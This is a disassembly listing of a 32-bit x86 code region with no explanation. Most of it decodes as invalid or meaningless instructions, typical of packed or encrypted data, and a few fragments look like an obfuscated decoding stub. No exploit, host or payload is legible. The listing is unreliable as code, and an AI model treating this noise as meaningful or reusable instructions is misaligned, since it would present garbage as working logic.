  40fe96:	push   ebp
  40fe97:	pusha  
  40fe98:	inc    ebp
  40fe99:	imul   eax,DWORD PTR [edi],0xffffffa0
  40fe9c:	ds jb  0x40feb1
  40fe9f:	mov    edx,0x505dacd3
  40fea4:	add    BYTE PTR [esi+0x4a],ah
  40fea7:	mov    edi,0x6ce2dcb4
  40feac:	sahf   
  40fead:	xchg   ebx,eax
  40feae:	mov    DWORD PTR [ecx],0xa38bec99
  40feb4:	je     0x40fe77
  40feb6:	sbb    cl,bh
  40feb8:	int3   
  40feb9:	sub    BYTE PTR [esp+eax*4+0x6b],0x52
  40febe:	ins    BYTE PTR es:[edi],dx
  40febf:	push   ds
  40fec0:	fadd   QWORD PTR [eax+0x55f3273f]
  40fec6:	mov    bl,0xd5
  40fec8:	xor    DWORD PTR [edx],0x26
  40fecb:	mov    dh,BYTE PTR [ecx]
  40fecd:	and    esp,0x3a
  40fed0:	or     al,0xf9
  40fed2:	outs   dx,BYTE PTR ds:[esi]
  40fed3:	or     al,0x9b
  40fed5:	cmp    al,BYTE PTR [esi-0x565f4100]
  40fedb:	jo     0x40ff50
  40fedd:	into   
  40fede:	jmp    0x40fe9f
  40fee0:	xchg   edi,eax
  40fee1:	fst    DWORD PTR [esp+ebx*1+0x37]
  40fee5:	and    ebp,DWORD PTR [edx]
  40fee7:	mov    ecx,0xb9dfb641
  40feec:	(bad)  
  40feed:	jecxz  0x40ff47
  40feef:	cld    
  40fef0:	frstor ds:0x2e68e240
  40fef6:	lahf   
  40fef7:	sbb    al,0x38
  40fef9:	push   eax
  40fefa:	loope  0x40fea1
  40fefc:	(bad)  
  40fefd:	in     eax,dx
  40fefe:	push   0xffffffa2
  40ff00:	inc    ebp
  40ff01:	lods   al,BYTE PTR ds:[esi]
  40ff02:	and    al,BYTE PTR [esi-0x68]
  40ff05:	mov    bl,0x6
  40ff07:	xor    eax,0xebd01412
  40ff0c:	jb     0x40fede
  40ff0e:	fild   QWORD PTR [edi-0x7fe7229a]
  40ff14:	push   ss
  40ff15:	aam    0x27
  40ff17:	or     eax,0x64041995
  40ff1c:	jmp    0x40ff89
  40ff1e:	sbb    BYTE PTR es:[ebp+0x20056a32],0x87
  40ff26:	cld    
  40ff27:	sub    BYTE PTR [ecx],bl
  40ff29:	push   edx
  40ff2a:	sub    al,0x2
  40ff2c:	out    0x58,al
  40ff2e:	cmc    
  40ff2f:	jno    0x40ff90
  40ff31:	gs pop edx
  40ff33:	dec    eax
  40ff34:	add    al,0x20
  40ff36:	jle    0x40fee2
  40ff38:	stc    
  40ff39:	mov    ch,0x52
  40ff3b:	sub    dl,BYTE PTR [eax]
  40ff3d:	push   ebp
  40ff3e:	adc    eax,0x8d44bd2b
  40ff43:	xor    eax,0x6ead736d
  40ff48:	mov    bl,0x82
  40ff4a:	aaa    
  40ff4b:	and    esp,ecx
  40ff4d:	(bad)  
  40ff4e:	pop    ebp
  40ff4f:	ss jecxz 0x40ff8f
  40ff52:	pop    esi
  40ff53:	xor    esp,ebp
  40ff55:	(bad)  
  40ff57:	arpl   WORD PTR [ecx],si
  40ff59:	push   esp
  40ff5a:	les    ebp,FWORD PTR [edi+0x5e]
  40ff5d:	int    0x72
  40ff5f:	clc    
  40ff60:	fwait
  40ff61:	sbb    ch,0xd7
  40ff64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff65:	into   
  40ff66:	stos   BYTE PTR es:[edi],al
  40ff67:	ret    
  40ff68:	and    BYTE PTR [eax+0xcf4b850],dh
  40ff6e:	mov    dh,0xa8
  40ff70:	ret    
  40ff71:	mov    dh,0xa
  40ff73:	jno    0x40ffb5
  40ff75:	add    BYTE PTR [ecx-0x4a],cl
  40ff78:	in     eax,dx
  40ff79:	mov    ebx,0x9252e4f5
  40ff7e:	scas   eax,DWORD PTR es:[edi]
  40ff7f:	jae    0x40ffa2
  40ff81:	mov    BYTE PTR [ecx-0x1aa7de7c],al
  40ff87:	push   edx
  40ff88:	jmp    0x8a65ef5c
  40ff8d:	cli    
  40ff8e:	pop    ebp
  40ff8f:	ja     0x40ffd5
  40ff91:	ret    
  40ff92:	xor    bh,al
  40ff94:	(bad)  
  40ff95:	sub    al,0xf3
  40ff97:	and    edi,ebp
  40ff99:	loopne 0x40ffab
  40ff9b:	mov    edi,0x369fef12
  40ffa0:	sub    eax,0xb5ac240b
  40ffa5:	mov    cl,0xdc
  40ffa7:	jl     0x410026
  40ffa9:	loop   0x410022
  40ffab:	loop   0x410004
  40ffad:	or     dh,BYTE PTR [esi]
  40ffaf:	mov    bh,0xf2
  40ffb1:	scas   eax,DWORD PTR es:[edi]
  40ffb2:	aam    0x7f
  40ffb4:	call   0x56928257
  40ffb9:	jmp    0x63d1:0xa902813d
  40ffc0:	push   ecx
  40ffc1:	addr16 mov ds:0x31e6,al
  40ffc5:	push   ds
  40ffc6:	mov    esp,0x82ce15fa
  40ffcb:	jne    0x41003e
  40ffcd:	repnz mov WORD PTR [edx-0x8],es
  40ffd1:	push   ecx
  40ffd2:	jmp    0x187a:0x6d24b765
  40ffd9:	nop
  40ffda:	sub    BYTE PTR [edx+eax*4-0x5a],al
  40ffde:	popa   
  40ffdf:	adc    DWORD PTR [eax],esi
  40ffe1:	dec    ebx
  40ffe2:	aaa    
  40ffe3:	sbb    eax,0xe965055c
  40ffe8:	sub    cl,dl
  40ffea:	sti    
  40ffeb:	add    al,0xb
  40ffed:	xor    al,0x4e
  40ffef:	dec    eax
  40fff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fff1:	loop   0x40ff8d
  40fff3:	push   ebx
  40fff4:	jmp    0x171b3af2
  40fff9:	loop   0x41006a
  40fffb:	out    dx,al
  40fffc:	dec    edx
  40fffd:	pop    eax
  40fffe:	adc    eax,0x81e754fa
  410003:	std    
  410004:	cld    
  410005:	sbb    DWORD PTR [ebp-0x4a],edi
  410008:	in     al,dx
  410009:	in     al,dx
  41000a:	test   al,0x54
  41000c:	sar    DWORD PTR [ebx-0x40af8938],1
  410012:	sub    al,0xd2
  410014:	popf   
  410015:	and    DWORD PTR [ecx*4+0x30d4d899],esi
  41001c:	ja     0x40ffc2
  41001e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41001f:	scas   eax,DWORD PTR es:[edi]
  410020:	jecxz  0x40fffa
  410022:	mov    eax,0x372e0026
  410027:	shl    BYTE PTR [edi+0x18],0xb8
  41002b:	test   BYTE PTR [ecx+esi*8+0x21],cl
  41002f:	mov    bl,0x8f
  410031:	sbb    ecx,DWORD PTR [ebx-0x20d40fa3]
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	int    0x8d
  41006a:	pop    es
  41006b:	(bad)  
  41006d:	dec    eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	rcl    eax,cl
  410076:	fs sub al,0x6f
  410079:	hlt    
  41007a:	das    
  41007b:	push   ebx
  41007c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41007d:	shr    BYTE PTR [eax-0x18],cl
  410080:	adc    eax,0x2c82269d
  410085:	sbb    DWORD PTR [esi],esi
  410087:	sub    eax,DWORD PTR [eax+esi*8]
  41008a:	lds    edi,FWORD PTR ds:[ebx+ebp*4+0x62]
  41008f:	push   ss
  410090:	xor    DWORD PTR [ebx-0x328b6585],ebx
  410096:	mov    BYTE PTR ds:0xb32412c1,ah
  41009c:	push   ss
  41009d:	aam    0xf5
  41009f:	clc    
  4100a0:	scas   al,BYTE PTR es:[edi]
  4100a1:	xor    ebp,ebx
  4100a3:	sbb    bh,BYTE PTR [ecx-0x8ba4417]
  4100a9:	cmp    al,0x2d
  4100ab:	in     eax,dx
  4100ac:	pushf  
  4100ad:	and    BYTE PTR [edi+ebp*8+0x7ccce1a8],ah
  4100b4:	xchg   ebx,eax
  4100b5:	(bad)  
  4100b6:	outs   dx,DWORD PTR ds:[esi]
  4100b7:	or     eax,0x8a97124e
  4100bc:	or     esi,ecx
  4100be:	mov    bh,0x71
  4100c0:	pop    ss
  4100c1:	enter  0xd45d,0x7e
  4100c5:	ss movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4100c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100c9:	jmp    0x410053
  4100cb:	mov    al,ds:0x788919a2
  4100d0:	clc    
  4100d1:	and    ebp,DWORD PTR [edx-0x4b]
  4100d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100d5:	rol    BYTE PTR [ecx-0x4149bcdb],0xbb
  4100dc:	jmp    0x410118
  4100de:	aas    
  4100df:	mov    al,ds:0xbd9a309b
  4100e4:	xor    DWORD PTR [ecx],edi
  4100e6:	imul   DWORD PTR [ebp+0x2fbdacc0]
  4100ec:	mov    ah,0x85
  4100ee:	and    DWORD PTR [eax-0x63],0x85b7ff76
  4100f5:	jmp    0x4100c3
  4100f7:	mov    BYTE PTR [esi-0x37],ch
  4100fa:	bound  eax,QWORD PTR [ebx-0x16]
  4100fd:	scas   al,BYTE PTR es:[edi]
  4100fe:	mov    al,0x5e
  410100:	cmp    DWORD PTR [eax-0x51],ebx
  410103:	pop    edi
  410104:	and    DWORD PTR fs:[edi-0x75710ead],0x856b47aa
  41010f:	lods   eax,DWORD PTR ds:[esi]
  410110:	and    al,0x0
  410112:	in     eax,0x7d
  410114:	jns    0x410137
  410116:	jg     0x4100b5
  410118:	jmp    0x410183
  41011a:	or     al,0x5a
  41011c:	gs jge 0x410149
  41011f:	mov    ah,0xb1
  410121:	adc    DWORD PTR [esp+eax*8-0x2f],esi
  410125:	inc    esp
  410126:	sbb    al,0xa9
  410128:	push   edi
  410129:	dec    ecx
  41012a:	adc    BYTE PTR [esi+0x6fd29c7c],ah
  410130:	ds scas eax,DWORD PTR es:[edi]
  410132:	leave  
  410133:	sbb    al,0x44
  410135:	fidiv  DWORD PTR [ecx-0x11]
  410138:	das    
  410139:	mov    al,ds:0xf968d70c
  41013e:	and    ebp,DWORD PTR [ecx-0x63]
  410141:	add    al,0x5c
  410143:	sbb    eax,0x54b8b720
  410148:	pop    edi
  410149:	gs (bad) 
  41014b:	in     eax,0xb4
  41014d:	ret    0x53af
  410150:	dec    ecx
  410151:	into   
  410152:	rol    BYTE PTR [edx-0x17],cl
  410155:	mov    bh,0xee
  410157:	lods   al,BYTE PTR ds:[esi]
  410158:	or     esp,eax
  41015a:	stos   DWORD PTR es:[edi],eax
  41015b:	cmp    eax,0x5490c0a0
  410160:	jge    0x4101b1
  410162:	xchg   esi,eax
  410163:	fwait
  410164:	dec    ebp
  410165:	ja     0x41015c
  410167:	out    0x32,al
  410169:	add    BYTE PTR [ebp-0x53],bh
  41016c:	sbb    ch,BYTE PTR [edi+0x44990441]
  410172:	repz push 0x8500f8d8
  410178:	loopne 0x4101bd
  41017a:	call   0x6c7a15cd
  41017f:	fwait
  410180:	std    
  410181:	xchg   esi,eax
  410182:	das    
  410183:	pop    edi
  410184:	in     al,dx
  410185:	xor    BYTE PTR [ecx+eax*4-0x6b2c1556],0xd6
  41018d:	or     eax,0xa22349ee
  410192:	sub    al,0xe7
  410194:	in     al,0xb4
  410196:	mov    eax,ds:0xc11b5b9b
  41019b:	scas   eax,DWORD PTR es:[edi]
  41019c:	xor    DWORD PTR [edx+ebx*8+0x4c],esi
  4101a0:	fimul  WORD PTR [eax+0x46a501ce]
  4101a6:	jp     0x4101e3
  4101a8:	dec    ebx
  4101a9:	or     eax,0xbf07b788
  4101ae:	imul   edx,DWORD PTR [edi+0x39],0x61
  4101b2:	mov    dl,0xa9
  4101b4:	out    0x3f,al
  4101b6:	cmp    esp,DWORD PTR [ecx+0x145f9bf8]
  4101bc:	das    
  4101bd:	pop    ss
  4101be:	pop    edx
  4101bf:	scas   al,BYTE PTR es:[edi]
  4101c0:	add    eax,0x32b31193
  4101c5:	mov    DWORD PTR [ecx*8-0x64e27b90],esi
  4101cc:	popa   
  4101cd:	imul   ebx,eax,0xeb794df4
  4101d3:	pop    esi
  4101d4:	bound  eax,QWORD PTR [edi+0x26]
  4101d7:	and    eax,0x3b62e331
  4101dc:	pop    esi
  4101dd:	mov    esp,0xf5ce08bc
  4101e2:	cmp    al,0x99
  4101e4:	inc    edx
  4101e5:	lods   eax,DWORD PTR ds:[esi]
  4101e6:	mov    edx,DWORD PTR [edi]
  4101e8:	outs   dx,BYTE PTR ds:[esi]
  4101e9:	pop    eax
  4101ea:	adc    dl,BYTE PTR [eax]
  4101ec:	out    0x99,eax
  4101ee:	xchg   edi,eax
  4101ef:	pusha  
  4101f0:	inc    ebp
  4101f1:	sahf   
  4101f2:	out    dx,eax
  4101f3:	mov    eax,0x1c853d16
  4101f8:	xor    DWORD PTR [ebx],esi
  4101fa:	pop    esi
  4101fb:	test   DWORD PTR [edi-0x6d],eax
  4101fe:	xchg   edx,eax
  4101ff:	jbe    0x4101ee
  410201:	and    ecx,0xffffff8b
  410204:	in     eax,dx
  410205:	fcomp  QWORD PTR [ecx]
  410207:	out    dx,eax
  410208:	fxch   st(0)
  41020a:	cwde   
  41020b:	dec    eax
  41020c:	cmp    dl,dh
  41020e:	pop    edx
  41020f:	xchg   edi,eax
  410210:	pop    ss
  410211:	xor    DWORD PTR [edi-0x56cddc4e],ecx
  410217:	das    
  410218:	in     eax,dx
  410219:	pushf  
  41021a:	mov    ecx,0xe1decffd
  41021f:	aas    
  410220:	cmp    al,0x55
  410222:	and    eax,DWORD PTR ss:[esi+0x75]
  410226:	mov    bh,0xd8
  410228:	out    dx,eax
  410229:	mov    bl,0xdc
  41022b:	adc    al,BYTE PTR ds:0x52470cc
  410231:	rcr    DWORD PTR [eax+0x19],1
  410234:	inc    ecx
  410235:	cmp    BYTE PTR [edi+ebp*1],ch
  410238:	inc    ebp
  410239:	jle    0x4101fe
  41023b:	pop    esp
  41023c:	retf   0x6ab3
  41023f:	fldenv [ebp-0x2dd8497c]
  410245:	bnd je 0x41020c
  410248:	das    
  410249:	pop    edi
  41024a:	dec    ebx
  41024b:	mov    ebp,0x2eac2a47
  410250:	jle    0x41027a
  410252:	leave  
  410253:	stos   BYTE PTR es:[edi],al
  410254:	inc    eax
  410255:	daa    
  410256:	ins    DWORD PTR es:[edi],dx
  410257:	add    eax,0x773fb0c3
  41025c:	(bad)  
  41025d:	adc    BYTE PTR [esp+edi*4-0x7470f5ef],bl
  410264:	jge    0x410268
  410266:	inc    ecx
  410267:	mov    edx,esp
  410269:	mov    BYTE PTR [eax-0x1d0bae30],dl
  41026f:	leave  
  410270:	add    al,0x82
  410272:	mov    al,ds:0xfd62c842
  410277:	mov    ebx,0x94920f5b
  41027c:	pop    eax
  41027d:	mov    bh,0xf0
  41027f:	mov    BYTE PTR [esi+0x6392bf5e],ch
  410285:	xor    al,0x88
  410287:	mov    eax,0x30a52263
  41028c:	call   0xfa794789
  410291:	test   BYTE PTR [ecx+0x6a],ch
  410294:	call   0x2987:0x49d8
  41029a:	xchg   BYTE PTR [edx+edx*2],ah
  41029d:	mov    edx,0xffdaa750
  4102a2:	add    al,0x9c
  4102a4:	pop    eax
  4102a5:	rol    al,1
  4102a7:	mov    dl,0xfe
  4102a9:	inc    ebx
  4102aa:	inc    ecx
  4102ab:	pop    ds
  4102ac:	inc    eax
  4102ad:	(bad)  
  4102ae:	addr16 push ecx
  4102b0:	arpl   WORD PTR [ebx+0x2322d121],cx
  4102b6:	test   al,0x5f
  4102b8:	aas    
  4102b9:	push   ds
  4102ba:	or     dh,al
  4102bc:	data16 in al,dx
  4102be:	lods   al,BYTE PTR ds:[esi]
  4102bf:	adc    DWORD PTR [esi+eiz*4-0x1f52aa59],0x4be43bef
  4102ca:	xor    DWORD PTR [ebp+edi*8+0xd6777c4],0xffffffd4
  4102d2:	enter  0x9cfd,0xe3
  4102d6:	sbb    DWORD PTR [ebp+0x7d],ebp
  4102d9:	cmp    BYTE PTR [esp+ebx*1+0x350e335],ch
  4102e0:	shr    ecx,1
  4102e2:	add    DWORD PTR [edx],0x0
  4102e5:	add    bl,al
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	xchg   DWORD PTR [edx+0x2d],edi
  4102f5:	aas    
  4102f6:	dec    esp
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	test   al,0x71
  410300:	sahf   
  410301:	nop
  410302:	sub    esp,ecx
  410304:	inc    edi
  410305:	jg     0x41034b
  410307:	inc    eax
  410308:	dec    esi
  410309:	pop    DWORD PTR [eax]
  41030b:	or     eax,esp
  41030d:	xor    BYTE PTR [ebp+0x68e0dfa9],0x14
  410314:	mov    edi,0xc1b1fbe6
  410319:	sysenter 
  41031b:	pop    ds
  41031c:	in     eax,dx
  41031d:	xchg   edi,eax
  41031e:	lods   al,BYTE PTR ds:[esi]
  41031f:	sub    al,0x64
  410321:	sbb    al,0x38
  410323:	enter  0x64b5,0x52
  410327:	jmp    0x3934b17f
  41032c:	into   
  41032d:	cdq    
  41032e:	neg    BYTE PTR [esi]
  410330:	cmp    al,0xca
  410332:	add    DWORD PTR [eax+0x5f118e65],ecx
  410338:	adc    BYTE PTR [ebp-0x2e],dh
  41033b:	shl    DWORD PTR [edx],cl
  41033d:	imul   BYTE PTR [eax+0x470cdfe0]
  410343:	mov    WORD PTR [edx-0x1f],ss
  410346:	jge    0x41033a
  410348:	out    0x22,al
  41034a:	jl     0x410382
  41034c:	xor    ah,BYTE PTR [ecx+eiz*8-0x10]
  410350:	int    0x1d
  410352:	mov    al,0xb1
  410354:	popf   
  410355:	mov    al,ds:0xa19fa72f
  41035a:	(bad)  
  41035c:	jp     0x410316
  41035e:	sahf   
  41035f:	rcl    ch,cl
  410361:	sbb    eax,0x4405c0fc
  410366:	in     al,0xae
  410368:	enter  0xc140,0x6e
  41036c:	dec    esi
  41036d:	sahf   
  41036e:	cvttps2pi mm5,QWORD PTR [ebx]
  410371:	pop    ebp
  410372:	mov    BYTE PTR [edi+0x55],dh
  410375:	pop    ds
  410376:	gs cld 
  410378:	or     esp,esi
  41037a:	jb     0x4103a4
  41037c:	or     ch,BYTE PTR [ebp+0x5a]
  41037f:	mov    bh,bl
  410381:	xor    ecx,DWORD PTR [edx+edx*1]
  410384:	add    eax,0xc89a5a16
  410389:	add    al,ch
  41038b:	or     bh,ah
  41038d:	pmovmskb esi,mm6
  410390:	pop    edi
  410391:	mov    eax,edi
  410393:	in     al,0x82
  410395:	xor    bh,BYTE PTR [eax+0x44532b43]
  41039b:	test   BYTE PTR ds:0xdac1807b,ch
  4103a1:	jo     0x4103d6
  4103a3:	xor    esi,esi
  4103a5:	dec    edi
  4103a6:	mov    DWORD PTR [ecx],ebp
  4103a8:	jmp    0x5276598d
  4103ad:	push   0xf
  4103af:	ret    
  4103b0:	adc    al,BYTE PTR es:[ecx]
  4103b3:	lds    eax,FWORD PTR [esi]
  4103b5:	push   ss
  4103b6:	jmp    0x2bf79118
  4103bb:	call   0x92412b9
  4103c0:	pop    ds
  4103c1:	xchg   edi,eax
  4103c2:	or     ah,BYTE PTR [esi]
  4103c4:	dec    esp
  4103c5:	adc    BYTE PTR [esi-0x77],bl
  4103c8:	bound  ecx,QWORD PTR [eax+0x2837ea4d]
  4103ce:	nop
  4103cf:	jbe    0x410420
  4103d1:	push   ecx
  4103d2:	fwait
  4103d3:	jg     0x41042d
  4103d5:	loop   0x410357
  4103d7:	add    DWORD PTR [ebp-0xa94fb4a],esp
  4103dd:	mov    edi,0x2005df31
  4103e2:	(bad)  
  4103e3:	in     eax,dx
  4103e4:	dec    eax
  4103e5:	add    ebp,DWORD PTR [ebp+0x17]
  4103e8:	inc    esp
  4103e9:	mov    dh,0xc3
  4103eb:	xchg   esi,eax
  4103ec:	and    eax,0x16e5b981
  4103f1:	data16 scas al,BYTE PTR es:[edi]
  4103f3:	ror    bl,cl
  4103f5:	ss scas al,BYTE PTR es:[edi]
  4103f7:	mov    ebx,0x5a1da96f
  4103fc:	jp     0x4103e4
  4103fe:	lds    ecx,FWORD PTR [eax+edx*8]
  410401:	jle    0x410414
  410403:	lods   al,BYTE PTR ds:[esi]
  410404:	mov    DWORD PTR [eax-0x74],ebx
  410407:	mov    gs,WORD PTR ds:0xd29f9754
  41040d:	dec    edi
  41040e:	dec    ecx
  41040f:	inc    eax
  410410:	ins    BYTE PTR es:[edi],dx
  410411:	sbb    eax,0x84c43612
  410416:	push   0xfffffff4
  410418:	(bad)  
  410419:	mov    al,0x4d
  41041b:	adc    al,0x36
  41041d:	sahf   
  41041e:	push   ss
  41041f:	fucom  st(5)
  410421:	scas   eax,DWORD PTR es:[edi]
  410422:	in     eax,dx
  410423:	jge    0x41045a
  410425:	and    bh,bh
  410427:	push   ss
  410428:	test   DWORD PTR [esi+0x54541282],esp
  41042e:	push   ds
  41042f:	and    eax,0x4c5dbacc
  410434:	(bad)  
  410435:	loop   0x4103dc
  410437:	add    ah,BYTE PTR [ebp+0x73dcbfc9]
  41043d:	inc    ecx
  41043e:	and    al,0x5a
  410440:	data16 shl BYTE PTR es:[eax-0x6f775a00],cl
  410448:	pop    eax
  410449:	mov    BYTE PTR [ebx-0x50620ac],bh
  41044f:	stos   DWORD PTR es:[edi],eax
  410450:	test   DWORD PTR [eax+0x2c7b7db8],esi
  410456:	das    
  410457:	and    ah,cl
  410459:	cld    
  41045a:	xchg   ecx,eax
  41045b:	add    ebp,edi
  41045d:	push   ecx
  41045e:	int3   
  41045f:	push   ecx
  410460:	sbb    BYTE PTR [eax+ebp*4-0x3cbffebb],bh
  410467:	pop    ss
  410468:	xor    eax,0x3e56a0d
  41046d:	mov    al,0x38
  41046f:	std    
  410470:	mov    bh,0xd1
  410472:	dec    edx
  410473:	sbb    edx,DWORD PTR [ecx-0x2bde85c5]
  410479:	imul   edi,DWORD PTR [esi+0x7e],0xc3e37b13
  410480:	xlat   BYTE PTR ds:[ebx]
  410481:	icebp  
  410482:	test   bh,bl
  410484:	fild   QWORD PTR [edi]
  410486:	pop    es
  410487:	fimul  DWORD PTR ds:0x294ac113
  41048d:	cwde   
  41048e:	out    0x8d,al
  410490:	icebp  
  410491:	xchg   edi,eax
  410492:	xchg   BYTE PTR [ebx],al
  410494:	ins    BYTE PTR es:[edi],dx
  410495:	(bad)  
  410497:	xlat   BYTE PTR ds:[ebx]
  410498:	out    0xc9,al
  41049a:	mov    cl,0xa7
  41049c:	mov    ch,0xd9
  41049e:	cmp    bl,BYTE PTR [ebx]
  4104a0:	int    0x30
  4104a2:	(bad)
  4104a6:	xor    al,0xf
  4104a8:	mov    ah,0xd0
  4104aa:	inc    eax
  4104ab:	shl    bl,0x3a
  4104ae:	pop    edx
  4104af:	loopne 0x4104e3
  4104b1:	imul   edi,esp,0xca0792ba
  4104b7:	pop    ebx
  4104b8:	xor    BYTE PTR [esi],cl
  4104ba:	mov    esp,0xe875e3f
  4104bf:	jne    0x4104e6
  4104c1:	add    DWORD PTR [edi],edi
  4104c3:	sbb    DWORD PTR [edi+esi*8-0x30],0x6c
  4104c8:	into   
  4104c9:	jecxz  0x41052c
  4104cb:	mov    edi,0xa9b5d802
  4104d0:	mov    edi,0xe46ab20f
  4104d5:	lods   eax,DWORD PTR ds:[esi]
  4104d6:	sbb    DWORD PTR [ebx+edi*4-0x74213ef7],edi
  4104dd:	call   0x26b26b45
  4104e2:	mov    al,ds:0x7e33930b
  4104e7:	lea    edi,[edi-0x3a]
  4104ea:	inc    ecx
  4104eb:	pop    esp
  4104ec:	nop
  4104ed:	pop    edx
  4104ee:	out    0x30,eax
  4104f0:	gs inc ebx
  4104f2:	mov    ds:0xfa417977,al
  4104f7:	stos   BYTE PTR es:[edi],al
  4104f8:	sbb    eax,0x2e9bb614
  4104fd:	arpl   WORD PTR [ebx-0x17414092],cx
  410503:	jge    0x4104bb
  410505:	out    0x75,al
  410507:	fdiv   st,st(2)
  410509:	and    DWORD PTR [edx],0x6e
  41050c:	iret   
  41050d:	ins    DWORD PTR es:[edi],dx
  41050e:	xchg   esp,eax
  41050f:	dec    ebx
  410510:	int3   
  410511:	repnz loope 0x410567
  410514:	mov    edi,0xda399717
  410519:	in     al,dx
  41051a:	and    al,0xb7
  41051c:	pop    edi
  41051d:	lock (bad) 
  41051f:	and    DWORD PTR [ecx],ebx
  410521:	mov    ds:0xc83d6f7,eax
  410526:	mov    WORD PTR [ebx+0x54],ds
  410529:	add    edx,esi
  41052b:	daa    
  41052c:	stc    
  41052d:	adc    ah,ah
  41052f:	js     0x410514
  410531:	and    al,0x95
  410533:	mov    al,0x65
  410535:	add    bh,0x89
  410538:	js     0xd3663d9b
  41053e:	xor    cl,ch
  410540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410541:	jo     0x4104fe
  410543:	mov    al,0xc9
  410545:	push   eax
  410546:	mov    eax,DWORD PTR [edi]
  410548:	(bad)  
  410549:	jmp    0xf84ff925
  41054e:	mov    BYTE PTR [edx],0x4c
  410551:	xor    DWORD PTR [esp+ebx*1+0xb],esi
  410555:	xor    bl,ah
  410557:	mov    dh,0x7c
  410559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41055a:	sti    
  41055b:	fs jne 0x410562
  41055e:	call   0xb760:0x1dee9f17
  410565:	xor    al,0x17
  410567:	aad    0xa4
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	mov    WORD PTR [esi+0x53390fff],ds
  410589:	js     0x410603
  41058b:	in     eax,0x7e
  41058d:	js     0x410607
  41058f:	rcr    eax,1
  410591:	xchg   BYTE PTR [ebp-0x18e1ce1c],dl
  410597:	inc    esi
  410598:	pop    eax
  410599:	and    esp,ebx
  41059b:	adc    cl,ah
  41059d:	push   es
  41059e:	mov    al,0xa3
  4105a0:	int3   
  4105a1:	fidiv  WORD PTR [ecx-0x7c8f8130]
  4105a7:	cmp    DWORD PTR [ecx-0x62f7ce62],ebx
  4105ad:	or     edi,eax
  4105af:	out    dx,eax
  4105b0:	lahf   
  4105b1:	vmread DWORD PTR [ecx+0x23],edi
  4105b5:	dec    edx
  4105b6:	out    0xdd,eax
  4105b8:	add    BYTE PTR [edx+0x31],ah
  4105bb:	aaa    
  4105bc:	aad    0x92
  4105be:	pop    esi
  4105bf:	mov    ds:0xdd47926f,eax
  4105c4:	es fwait
  4105c6:	adc    eax,0x8e39bdb7
  4105cb:	xor    eax,0xa93e203b
  4105d0:	fs sub eax,0xa02bc127
  4105d6:	stc    
  4105d7:	cwde   
  4105d8:	dec    ebx
  4105d9:	nop
  4105da:	mov    ebx,0x1b36f386
  4105df:	push   edx
  4105e0:	and    eax,0x324cb97e
  4105e5:	arpl   WORD PTR [ebp+ebx*4-0xa],si
  4105e9:	cmc    
  4105ea:	add    al,BYTE PTR [eax]
  4105ec:	mov    ch,0x64
  4105ee:	loop   0x41064b
  4105f0:	(bad)  
  4105f1:	sti    
  4105f2:	imul   ebp,DWORD PTR [edi+0x1e],0xffffffa7
  4105f6:	aad    0x3b
  4105f8:	imul   ebx,DWORD PTR [ecx+0x37],0x1e
  4105fc:	jo     0x41062a
  4105fe:	sub    dh,BYTE PTR [edx]
  410600:	dec    edi
  410601:	pop    DWORD PTR [eax]
  410603:	scas   al,BYTE PTR es:[edi]
  410604:	fadd   QWORD PTR [ebx+0x7c]
  410607:	dec    esp
  410608:	mov    ah,0xa7
  41060a:	fsub   st(6),st
  41060c:	add    DWORD PTR [ebp+esi*2-0x5],eax
  410610:	fs jge 0x4105e2
  410613:	push   eax
  410614:	sbb    DWORD PTR [eax],eax
  410616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410618:	jo     0x4105b2
  41061a:	mov    dl,0x58
  41061c:	cdq    
  41061d:	push   ebx
  41061e:	addr16 mov ds:0xa93f,al
  410622:	mov    ds:0x802c190c,eax
  410627:	retf   0x2aa8
  41062a:	mov    esi,0xac800731
  41062f:	jnp    0x41068e
  410631:	outs   dx,BYTE PTR ds:[esi]
  410632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410633:	mov    ecx,DWORD PTR [edi+0x31]
  410636:	ror    BYTE PTR [edx],0x6f
  410639:	xchg   esp,eax
  41063a:	or     eax,DWORD PTR [eax+0x6c]
  41063d:	pop    ebp
  41063e:	lea    esp,[esi-0x4ee4cdff]
  410644:	mov    bh,0xf7
  410646:	mov    edx,0xecb6b235
  41064b:	ret    
  41064c:	or     eax,0x4f651c21
  410651:	mov    edx,DWORD PTR gs:[ecx]
  410654:	fwait
  410655:	hlt    
  410656:	push   edx
  410657:	jmp    0x151:0xf33dd3c4
  41065e:	arpl   WORD PTR [edx],dx
  410660:	jle    0x4106b9
